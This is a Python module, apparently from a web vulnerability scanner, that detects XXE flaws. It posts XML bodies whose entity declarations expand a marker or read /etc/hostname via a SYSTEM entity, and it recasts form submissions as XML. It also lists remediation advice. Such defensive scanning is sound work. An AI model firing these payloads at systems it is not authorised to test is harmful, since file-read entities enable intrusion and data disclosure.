"""
XXE (XML External Entity) detection engine — in-band, broadened.

XXE happens when an application parses user-supplied XML with a parser that
resolves external entities, letting an attacker read local files or reach
internal systems.

This in-band detector tries, for each candidate endpoint, several ways to
get XML accepted and then checks whether a defined entity was expanded in
the response (proof the parser processes entities). Improvements over the
first version:

  1. Multiple XML content-types (application/xml, text/xml).
  2. Converting known POST FORMS into equivalent XML bodies, so endpoints
     that normally take form data but also accept XML (a very common real
     case, e.g. a stock-check endpoint) get covered.
  3. Basic blind signal: besides the reflected marker, an XML parse ERROR
     that mentions entities/DOCTYPE is recorded as a weaker "possible XXE"
     signal worth manual review (not reported as confirmed).

It still cannot find XXE on endpoints that do not process XML at all, and
it does NOT do out-of-band detection (planned separately, needs a
collector). The file-read probe targets /etc/hostname (non-sensitive) only
as a proof-of-concept marker.
"""

import requests
from urllib.parse import urlparse

from . import scan_log

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

MARKER = "xxe_probe_marker_8d2f"
XML_CONTENT_TYPES = ["application/xml", "text/xml"]

# Signs that the server tried to parse XML (even if not vulnerable) — used
# only to flag endpoints for manual review, never as a confirmed finding.
PARSE_ERROR_HINTS = ["doctype", "entity", "xml parsing", "not well-formed",
                     "premature end", "xmlexception", "saxparse"]

REMEDIATION = (
    "Disable external entity and DTD processing in the XML parser (e.g. "
    "disallow-doctype-decl, FEATURE_SECURE_PROCESSING), or use a parser "
    "configured to reject DOCTYPEs. Never parse untrusted XML with external "
    "entities enabled."
)


def _entity_body(inner):
    return (f'<?xml version="1.0"?>'
            f'<!DOCTYPE r [ <!ENTITY x {inner}> ]>'
            f'<r>&x;</r>')


def _wrap_form_as_xml(other_fields, field):
    """Turn a form's fields into an XML doc where `field` holds the entity."""
    parts = ['<?xml version="1.0"?>',
             '<!DOCTYPE root [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>',
             '<root>']
    for k, v in other_fields.items():
        parts.append(f"<{k}>{v}</{k}>")
    parts.append(f"<{field}>&x;</{field}>")
    parts.append("</root>")
    return "".join(parts)


# Candidate bodies that don't depend on a form's shape.
GENERIC_BODIES = [
    (_entity_body(f'"{MARKER}"'), "entity expansion"),
    (_entity_body('SYSTEM "file:///etc/hostname"'), "file read"),
]


def _endpoints_generic(points, pages):
    urls = set(pages or [])
    for p in points:
        if p.location == "body":
            urls.add(p.url)
    return sorted(urls)


def _form_targets(points):
    """POST form points, so we can rebuild them as XML."""
    seen = {}
    for p in points:
        if p.location == "body":
            # one XML attempt per (url, field) is plenty; dedupe by url
            seen.setdefault(p.url, p)
    return list(seen.values())


def _finding(url, evidence):
    return {
        "type": "XXE (XML External Entity)",
        "severity": "high",
        "injection_point": {"kind": "XML body", "name": "(request body)",
                            "url": url, "method": "post"},
        "technique": "in-band external entity resolution",
        "evidence": evidence,
        "remediation": REMEDIATION,
    }


def _try(url, body):
    """POST a body under each XML content-type. Return response text or None."""
    for ct in XML_CONTENT_TYPES:
        try:
            r = requests.post(url, data=body.encode("utf-8"),
                              headers={**HEADERS, "Content-Type": ct}, timeout=25)
            yield r.text
        except requests.exceptions.RequestException:
            continue


def scan(points, pages=None):
    findings = []
    confirmed_urls = set()
    review_urls = set()

    # 1) generic entity/file bodies against every candidate endpoint
    for url in _endpoints_generic(points, pages):
        scan_log.transient(f"XXE (generic): {url}")
        hit = False
        for body, _label in GENERIC_BODIES:
            for text in _try(url, body):
                low = text.lower()
                if MARKER in text:
                    findings.append(_finding(
                        url, f"Defined XML entity was expanded in the response "
                             f"(marker '{MARKER}' returned)."))
                    scan_log.add_finding("XXE (XML External Entity)", f"XXE at {url}")
                    confirmed_urls.add(url)
                    hit = True
                    break
                if any(h in low for h in PARSE_ERROR_HINTS):
                    review_urls.add(url)
            if hit:
                break

    # 2) convert known POST forms into XML and retry (covers form endpoints
    #    that accept XML, like a stock-check endpoint)
    for p in _form_targets(points):
        if p.url in confirmed_urls:
            continue
        scan_log.transient(f"XXE (form->xml): {p.url}")
        body = _wrap_form_as_xml(p.other_fields, p.field)
        # swap the file entity for the marker to confirm entity processing
        marker_body = body.replace(
            '<!ENTITY x SYSTEM "file:///etc/hostname">',
            f'<!ENTITY x "{MARKER}">')
        found = False
        for text in _try(p.url, marker_body):
            low = text.lower()
            if MARKER in text:
                findings.append(_finding(
                    p.url, "A form endpoint accepted XML and expanded a defined "
                           f"entity (marker '{MARKER}' returned)."))
                scan_log.add_finding("XXE (XML External Entity)", f"XXE at {p.url}")
                confirmed_urls.add(p.url)
                found = True
                break
            if any(h in low for h in PARSE_ERROR_HINTS):
                review_urls.add(p.url)
        if found:
            continue

    # 3) endpoints that showed XML-parsing signs but weren't confirmed:
    #    log for manual review only (not a confirmed finding).
    for url in review_urls - confirmed_urls:
        scan_log.logger.info(
            f"[XXE-REVIEW] {url}: server appears to parse XML (parse-related "
            f"response) but entity expansion was not confirmed — worth a manual check.")

    return findings